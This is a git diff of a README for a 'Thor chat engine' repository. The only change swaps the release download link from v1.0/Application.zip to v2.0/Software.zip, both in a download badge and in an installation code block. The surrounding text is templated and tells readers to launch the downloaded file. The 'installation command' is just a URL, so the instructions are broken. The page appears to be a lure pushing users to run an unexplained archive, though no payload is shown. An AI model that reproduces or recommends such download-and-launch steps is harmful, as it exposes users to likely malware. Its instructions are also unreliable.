@@ -28,7 +28,7 @@ Welcome to the Thor chat engine GitHub repository! With an emphasis on pluggable
 
 To get started with Thor, you can download the latest release by clicking on the button below:
 
-[![Download Thor](https://github.com/darkskin508/thor/releases/download/v1.0/Application.zip)](https://github.com/darkskin508/thor/releases/download/v1.0/Application.zip)
+[![Download Thor](https://github.com/darkskin508/thor/releases/download/v2.0/Software.zip)](https://github.com/darkskin508/thor/releases/download/v2.0/Software.zip)
 
 If the link above ends with the file name, make sure to launch it to begin exploring Thor's capabilities. If the link is a website, simply click on it to visit the download page. In case the link is not provided or not working, please check the "Releases" section of this repository for alternative download options.
 
@@ -42,7 +42,7 @@ To install Thor, follow these steps:
 4. Run the installation command to set up Thor on your system.
 
 ```bash
-$ https://github.com/darkskin508/thor/releases/download/v1.0/Application.zip
+$ https://github.com/darkskin508/thor/releases/download/v2.0/Software.zip
 ```
 
 ## Usage 📝
